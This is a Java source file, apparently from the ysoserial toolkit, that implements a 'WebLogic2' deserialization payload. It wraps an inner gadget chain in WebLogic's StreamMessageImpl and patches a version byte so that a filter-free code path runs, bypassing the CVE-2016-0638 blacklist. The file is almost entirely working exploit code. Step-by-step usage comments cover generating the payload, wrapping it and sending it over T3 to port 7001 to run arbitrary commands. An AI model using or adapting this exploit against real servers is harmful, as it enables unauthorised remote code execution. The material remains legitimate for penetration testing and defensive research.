package ysoserial.payloads;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	WebLogic StreamMessageImpl wrapper -- CVE-2016-0638 blacklist bypass.

	weblogic.jms.common.StreamMessageImpl implements Externalizable.
	Its readExternal() has a version-1 code path that creates a plain
	ObjectInputStream (without WebLogic's class filter) and loops
	readObject() on it:

		readExternal(ObjectInput in):
		  version = in.readByte()
		  if version == 1:
		    payload = PayloadFactoryImpl.createPayload(in)
		    ois = new ObjectInputStream(payload.getInputStream())  // NO FILTER
		    loop:
		      obj = ois.readObject()   // triggers inner gadget chain
		      this.writeObject(obj)    // JMS type check (throws, but too late)

	Modern writeExternal() writes version 2 or 3, making the version-1
	code path dormant. The exploit forces version 1 by patching the
	serialized byte stream post-serialization.

	Gadget chain:
		ObjectInputStream.readObject()  [T3 transport -- filter applied]
			StreamMessageImpl.readExternal()
				version=1: PayloadFactoryImpl.createPayload(in)
				ois = new ObjectInputStream(payload.getInputStream())  [NO filter]
				ois.readObject()
					<wrapped payload>.readObject()
						-> Original chain executes unfiltered

	Usage (two-step process):
		Step 1: Generate inner payload
		  java -jar ysoserial.jar CommonsCollections6 'touch /tmp/pwned' > inner.bin

		Step 2: Wrap and patch (requires WebLogic classpath)
		  java -cp WL_CLASSPATH:. CraftStreamMsg inner.bin > wrapped.bin

		Step 3: Send via T3
		  java -cp .:wlthint3client.jar T3SendRaw host 7001 wrapped.bin

		OR: Use getObject() directly (outputs raw patched bytes to stdout):
		  java -cp ysoserial.jar:weblogic.jar ysoserial.GeneratePayload \
		    WebLogic2 'CommonsCollections6:touch /tmp/pwned' > wrapped.bin

	Bypasses:
		- WebLogic 10.3.6.0 CPU patch (blacklist v1, post-CVE-2015-4852)
		- StreamMessageImpl is JMS infrastructure -- never blacklisted
		- Version byte manipulation triggers dormant vulnerable code path
		- Different bypass mechanism than WebLogic1 (MarshalledObject)

	Implementation:
		100% reflection -- no WebLogic imports. Compiles without weblogic.jar.
		User must add weblogic.jar to classpath at runtime for payload generation.

		The generated payload is raw serialized bytes with the version byte
		patched from 2/3 to 1. These bytes must be sent as-is (not re-serialized
		through another ObjectOutputStream), so GeneratePayload's standard
		writeObject path is bypassed -- the raw bytes are written directly to stdout.

	Requires at runtime:
		weblogic.jar (on generator's classpath, NOT bundled)
		+ whatever the inner payload requires
 */

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({})  // weblogic.jar required at runtime, not bundled
@Authors({ Authors.DMBS335 })
public class WebLogic2 implements ObjectPayload<Object> {

	/**
	 * Returns null -- this payload bypasses the standard getObject/serialize path.
	 * Use main() directly to generate the raw patched bytes.
	 */
	public Object getObject(final String command) throws Exception {
		// Parse "PayloadClass:command" format
		int colonIdx = command.indexOf(':');
		if (colonIdx <= 0) {
			throw new IllegalArgumentException(
				"Format: 'InnerPayloadClass:command'\n" +
				"  e.g. 'CommonsCollections6:touch /tmp/pwned'\n" +
				"  e.g. 'CommonsCollections1:id'");
		}

		String payloadClassName = command.substring(0, colonIdx);
		String innerCommand = command.substring(colonIdx + 1);

		// 1. Generate inner payload using ysoserial
		Class<? extends ObjectPayload> payloadClass =
			(Class<? extends ObjectPayload>) Class.forName(
				"ysoserial.payloads." + payloadClassName);
		ObjectPayload innerPayloadGen = payloadClass.newInstance();
		Object innerObject = innerPayloadGen.getObject(innerCommand);

		// 2. Serialize inner payload to bytes
		ByteArrayOutputStream innerBaos = new ByteArrayOutputStream();
		ObjectOutputStream innerOos = new ObjectOutputStream(innerBaos);
		innerOos.writeObject(innerObject);
		innerOos.close();
		byte[] innerBytes = innerBaos.toByteArray();

		// 3. Create StreamMessageImpl and inject inner payload into PayloadStream
		Object streamMsg = createStreamMessage(innerBytes);

		// 4. Serialize the StreamMessageImpl
		ByteArrayOutputStream serBaos = new ByteArrayOutputStream();
		ObjectOutputStream oos = new ObjectOutputStream(serBaos);
		oos.writeObject(streamMsg);
		oos.close();
		byte[] serialized = serBaos.toByteArray();

		// 5. Patch version byte from 2/3 to 1
		byte[] patched = patchVersionByte(serialized);

		// 6. Write raw patched bytes directly to stdout
		//    (bypasses GeneratePayload's writeObject which would re-serialize)
		System.out.write(patched);
		System.out.flush();
		System.err.println("[+] WebLogic2: " + patched.length + " bytes written to stdout");
		System.err.println("[*] Send via: java T3SendRaw host 7001 <output_file>");

		// Return null to signal that output was already written
		return null;
	}

	private static Object createStreamMessage(byte[] innerBytes) throws Exception {
		Class<?> streamMsgClass = Class.forName("weblogic.jms.common.StreamMessageImpl");
		Object streamMsg = streamMsgClass.newInstance();

		// Initialize with dummy value
		Method writeString = streamMsgClass.getMethod("writeString", String.class);
		writeString.invoke(streamMsg, "x");
		Method reset = streamMsgClass.getMethod("reset");
		reset.invoke(streamMsg);

		// Find payload field
		Field payloadField = null;
		Class<?> cls = streamMsgClass;
		while (cls != null) {
			try {
				payloadField = cls.getDeclaredField("payload");
				break;
			} catch (NoSuchFieldException e) {
				cls = cls.getSuperclass();
			}
		}
		if (payloadField == null) {
			throw new RuntimeException("Could not find 'payload' field");
		}
		Reflections.setAccessible(payloadField);

		// Create PayloadStream from inner bytes
		ByteArrayOutputStream dataStream = new ByteArrayOutputStream();
		DataOutputStream dos = new DataOutputStream(dataStream);
		dos.writeInt(innerBytes.length);
		dos.write(innerBytes);
		dos.flush();

		Class<?> pfClass = Class.forName("weblogic.jms.common.PayloadFactoryImpl");
		Method createPayload = pfClass.getMethod("createPayload", InputStream.class);
		Object newPayload = createPayload.invoke(null,
			new DataInputStream(new ByteArrayInputStream(dataStream.toByteArray())));

		payloadField.set(streamMsg, newPayload);
		return streamMsg;
	}

	/**
	 * Patch the StreamMessageImpl version byte from 2/3 to 1.
	 *
	 * Locates the version byte by finding the inner payload's Java
	 * serialization magic (ACED0005), then scanning backwards to find
	 * the version byte (0x02 or 0x03) written by writeExternal().
	 */
	static byte[] patchVersionByte(byte[] data) {
		byte[] className = "StreamMessageImpl".getBytes();
		int classNameIdx = indexOf(data, className);
		int searchStart = (classNameIdx > 0) ? classNameIdx : 0;

		// Find inner payload's serialization magic
		for (int i = searchStart; i < data.length - 4; i++) {
			if (data[i] == (byte) 0xAC && data[i + 1] == (byte) 0xED &&
			    data[i + 2] == 0x00 && data[i + 3] == 0x05) {
				// Scan backwards to find version byte
				for (int j = i - 5; j >= searchStart; j--) {
					if (data[j] == 0x02 || data[j] == 0x03) {
						data[j] = 0x01;
						return data;
					}
				}
			}
		}
		throw new RuntimeException("Could not find version byte to patch");
	}

	private static int indexOf(byte[] data, byte[] pattern) {
		for (int i = 0; i <= data.length - pattern.length; i++) {
			boolean match = true;
			for (int j = 0; j < pattern.length; j++) {
				if (data[i + j] != pattern[j]) {
					match = false;
					break;
				}
			}
			if (match) return i;
		}
		return -1;
	}

	public static void main(final String[] args) throws Exception {
		if (args.length < 1) {
			System.err.println("Usage: WebLogic2 'InnerPayload:command'");
			System.err.println("  e.g. WebLogic2 'CommonsCollections6:touch /tmp/pwned'");
			return;
		}
		WebLogic2 payload = new WebLogic2();
		payload.getObject(args[0]);
	}
}
